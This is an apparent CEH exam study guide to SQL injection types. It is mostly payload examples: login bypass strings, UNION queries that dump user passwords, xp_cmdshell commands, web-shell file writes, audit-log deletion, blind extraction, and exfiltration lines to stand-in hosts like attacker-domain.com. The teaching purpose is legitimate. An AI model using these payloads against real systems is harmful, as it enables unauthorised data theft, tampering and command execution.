# Various Types of SQL Injection Attacks

## In-Band SQL Injection

In-band SQL injection is the most common and straightforward type where the attacker uses the same communication channel to launch the attack and gather results. The attacker can see the results directly in the application's response.

### Error-Based SQL Injection

Error-based injection relies on database error messages to gather information about the database structure.

#### Mechanism
- Triggers database errors intentionally
- Extracts information from error messages
- Uses database-specific functions to cause errors

#### Common Techniques

**MySQL Error-Based**
```sql
-- Trigger error with extractvalue()
' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--

-- Double query technique
' UNION SELECT 1, count(*), concat((SELECT version()), 0x3a, floor(rand()*2)) as a FROM information_schema.tables GROUP BY a--
```

**SQL Server Error-Based**
```sql
-- Convert function error
' AND 1=CONVERT(int, (SELECT @@version))--

-- Cast function error
' AND 1=CAST((SELECT user_name()) as int)--
```

**Oracle Error-Based**
```sql
-- UTL_INADDR.GET_HOST_NAME error
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

-- CTXSYS.DRITHSX.SN error
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

### System Stored Procedure Injection

Exploits database-specific stored procedures to execute system commands or gather information.

#### SQL Server Stored Procedures
```sql
-- Execute system commands
'; EXEC xp_cmdshell 'dir c:\'--

-- Read files
'; EXEC xp_cmdshell 'type c:\windows\system32\drivers\etc\hosts'--

-- Network enumeration
'; EXEC xp_cmdshell 'ping -n 1 192.168.1.1'--
```

#### MySQL System Functions
```sql
-- Load file content
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3--

-- Write file to system
' UNION SELECT 'malicious content' INTO OUTFILE '/var/www/html/shell.php'--
```

### Illegal/Logically Incorrect Query

Creates syntax or logical errors to extract database information through error messages.

#### Syntax Errors
```sql
-- Unclosed quote
admin'

-- Invalid operator
' AND 1=1 AND '1'='2

-- Invalid function
' AND ascii()--
```

#### Logical Errors
```sql
-- Division by zero
' AND 1/0--

-- Type conversion errors
' AND 1='string'--

-- Invalid column count
' ORDER BY 100--
```

### Union SQL Injection

Combines results from multiple SELECT statements to extract data from different tables.

#### Union Requirements
1. Same number of columns in both SELECT statements
2. Compatible data types in corresponding columns
3. Proper positioning of UNION keyword

#### Union Attack Process

**Step 1: Determine Column Count**
```sql
' ORDER BY 1--    (works)
' ORDER BY 2--    (works)
' ORDER BY 3--    (works)
' ORDER BY 4--    (error - 3 columns confirmed)
```

**Step 2: Identify Data Types**
```sql
' UNION SELECT 1, 2, 3--
' UNION SELECT 'a', 'b', 'c'--
```

**Step 3: Extract Database Information**
```sql
-- Database version and user
' UNION SELECT 1, version(), user()--

-- Database names
' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata--

-- Table names
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='database_name'--

-- Column names
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--

-- Data extraction
' UNION SELECT 1, username, password FROM users--
```

### Tautology-Based Injection

Uses conditions that are always true to bypass authentication or extract data.

#### Common Tautology Conditions
```sql
-- Always true conditions
OR 1=1
OR 'a'='a'
OR 2>1
OR 'x'='x'

-- Authentication bypass
admin' OR '1'='1'--
admin' OR 2>1#
```

#### Application Examples
```sql
-- Login bypass
username: admin' OR 1=1--
password: anything

-- Search manipulation
search_term: ' OR 1=1--
```

### End of Line Comment

Uses comment syntax to ignore the rest of the SQL query.

#### Comment Syntax by Database
```sql
-- MySQL/MSSQL/PostgreSQL
admin'--

-- MySQL alternative
admin'#

-- Oracle (requires space or newline)
admin'-- 

-- Generic (works in most databases)
admin'/*
```

#### Comment Injection Examples
```sql
-- Bypass password check
username: admin'--
-- Result: SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- Terminate query early
search: test'-- AND status='active'
-- Result: SELECT * FROM products WHERE name='test'-- AND status='active'
```

### Inline Comments

Uses comment blocks within the SQL statement to bypass filtering or obfuscate payloads.

#### Comment Block Syntax
```sql
-- MySQL
admin'/*comment*/OR/*comment*/1=1--

-- SQL Server
admin'/*comment*/OR/*comment*/1=1--

-- Oracle
admin'/*comment*/OR/*comment*/1=1--
```

#### Obfuscation Techniques
```sql
-- Bypass keyword filtering
admin'/**/UNION/**/SELECT/**/1,2,3--

-- Split keywords
admin'/**/UN/**/ION/**/SE/**/LECT/**/user(),version()--

-- Mixed with spaces
admin' /**/ OR /**/ 1=1 /**/ --
```

### Piggybacked Query

Executes additional SQL statements after the original query by using statement separators.

#### Statement Separators
- Semicolon (;) - Most databases
- Batch separators in specific contexts

#### Piggybacked Examples
```sql
-- Data manipulation
admin'; INSERT INTO users (username, password) VALUES ('hacker', 'password123')--

-- Data deletion
admin'; DELETE FROM audit_logs WHERE date < '2024-01-01'--

-- Multiple operations
admin'; UPDATE users SET role='admin' WHERE username='hacker'; SELECT * FROM users--
```

## Blind/Inferential SQL Injection

Blind SQL injection occurs when the application doesn't return database errors or data directly, but the attacker can infer information based on application behavior.

### Boolean-Based Blind Exploitation

Determines information by sending payloads that result in different application responses based on TRUE/FALSE conditions.

#### Boolean Logic Testing
```sql
-- Test if database exists
' AND (SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name='target_db') > 0--

-- Test if table exists
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0--

-- Test if column exists
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE column_name='password' AND table_name='users') > 0--
```

#### Character-by-Character Extraction
```sql
-- Extract database name length
' AND LENGTH(database()) = 8--

-- Extract first character of database name
' AND ASCII(SUBSTRING(database(), 1, 1)) = 116--  -- 't'

-- Extract username length
' AND LENGTH((SELECT username FROM users LIMIT 1)) = 5--

-- Extract password character
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97--  -- 'a'
```

#### Automated Boolean Extraction Example
```python
# Pseudocode for automated extraction
for position in range(1, max_length):
    for ascii_val in range(32, 127):
        payload = f"' AND ASCII(SUBSTRING(database(), {position}, 1)) = {ascii_val}--"
        if send_request(payload).indicates_true():
            result += chr(ascii_val)
            break
```

### Heavy Query (Time-Based Blind)

Uses time delays to infer information when boolean responses are not available.

#### Time Delay Functions
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)--
' AND BENCHMARK(5000000, MD5('test'))--

-- SQL Server
' AND IF(1=1, WAITFOR DELAY '0:0:5', 0)--

-- PostgreSQL
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--

-- Oracle
' AND CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE 0 END FROM dual--
```

#### Time-Based Information Extraction
```sql
-- Test if database name starts with 'a'
' AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 97, SLEEP(5), 0)--

-- Test table existence with delay
' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--

-- Extract user count with delay
' AND IF((SELECT COUNT(*) FROM users) = 10, SLEEP(5), 0)--
```

#### Advanced Time-Based Techniques
```sql
-- Binary search for numeric values
' AND IF((SELECT COUNT(*) FROM users) > 50, SLEEP(5), 0)--
' AND IF((SELECT COUNT(*) FROM users) > 25, SLEEP(5), 0)--
' AND IF((SELECT COUNT(*) FROM users) > 12, SLEEP(5), 0)--

-- Conditional time delays
' AND CASE 
    WHEN (SELECT username FROM users LIMIT 1) LIKE 'a%' THEN SLEEP(3)
    WHEN (SELECT username FROM users LIMIT 1) LIKE 'b%' THEN SLEEP(4)
    ELSE SLEEP(1)
  END--
```

## Out-of-Band SQL Injection

Out-of-band injection uses different communication channels to extract data, typically when in-band techniques are not possible.

### DNS Exfiltration

Uses DNS queries to extract data from the database.

#### DNS-Based Data Extraction
```sql
-- SQL Server with xp_dirtree
'; EXEC xp_dirtree '\\' + (SELECT user_name()) + '.attacker-domain.com\share'--

-- MySQL with LOAD_FILE (Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker-domain.com\\share'))--

-- Oracle with UTL_HTTP
' AND UTL_HTTP.request('http://attacker-domain.com/collect?data=' || user) IS NOT NULL--
```

#### HTTP-Based Exfiltration
```sql
-- SQL Server with UTL_HTTP (if available)
' UNION SELECT UTL_HTTP.request('http://attacker-domain.com/collect?data=' || user_name())--

-- Custom stored procedure for HTTP requests
'; EXEC sp_send_http_request 'http://attacker-domain.com/collect', (SELECT @@version)--
```

### File-Based Out-of-Band

Writes data to files accessible by the attacker.

#### File Writing Techniques
```sql
-- MySQL INTO OUTFILE
' UNION SELECT username, password FROM users INTO OUTFILE '/var/www/html/dump.txt'--

-- SQL Server with xp_cmdshell and echo
'; EXEC xp_cmdshell 'echo ' + (SELECT user_name()) + ' > c:\temp\output.txt'--

-- PostgreSQL COPY TO
' UNION SELECT username FROM users; COPY (SELECT password FROM users) TO '/tmp/passwords.txt'--
```

### Email-Based Exfiltration

Uses database mail functions to send data via email.

#### Email Exfiltration Examples
```sql
-- SQL Server Database Mail
'; EXEC msdb.dbo.sp_send_dbmail 
    @recipients = 'attacker@domain.com',
    @subject = 'Data Exfiltration',
    @body = (SELECT @@version)--

-- Oracle UTL_SMTP
' AND UTL_SMTP.send_email('attacker@domain.com', 'Database Info', (SELECT user FROM dual)) IS NOT NULL--
```

### Network-Based Exfiltration

Uses network functions to transmit data to external servers.

#### Network Exfiltration Methods
```sql
-- Oracle UTL_TCP
' AND UTL_TCP.send_data('attacker-ip', 4444, (SELECT user FROM dual)) IS NOT NULL--

-- SQL Server with OLE Automation
'; DECLARE @obj INT; EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @obj OUT; 
   EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker-domain.com/collect?data=' + (SELECT user_name())--
```

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **In-Band Injection**: Direct data retrieval through application responses
2. **Error-Based Techniques**: Information gathering through database errors
3. **Union Attacks**: Combining multiple SELECT statements for data extraction
4. **Blind Injection**: Inferring information without direct data display
5. **Out-of-Band Methods**: Using alternative channels for data exfiltration
6. **Boolean Logic**: TRUE/FALSE condition testing for information discovery
7. **Time-Based Attacks**: Using delays to infer database information

### Exam Focus Areas
- **Attack Classification**: Distinguishing between in-band, blind, and out-of-band techniques
- **Union Requirements**: Column count and data type matching
- **Boolean Exploitation**: Character-by-character data extraction methods
- **Time-Based Detection**: Recognizing delay-based injection attempts
- **Error Message Analysis**: Extracting information from database errors
- **Stored Procedure Abuse**: System command execution through database functions
- **Tautology Conditions**: Authentication bypass using always-true statements
- **Comment Injection**: Query manipulation using comment syntax

### Practical Skills
- Identify appropriate injection technique based on application behavior
- Construct union-based payloads with proper column alignment
- Implement boolean-based blind injection for data extraction
- Recognize time-based injection indicators in application responses
- Analyze error messages for database structure information
- Evaluate out-of-band exfiltration possibilities
- Understand the progression from basic to advanced injection techniques
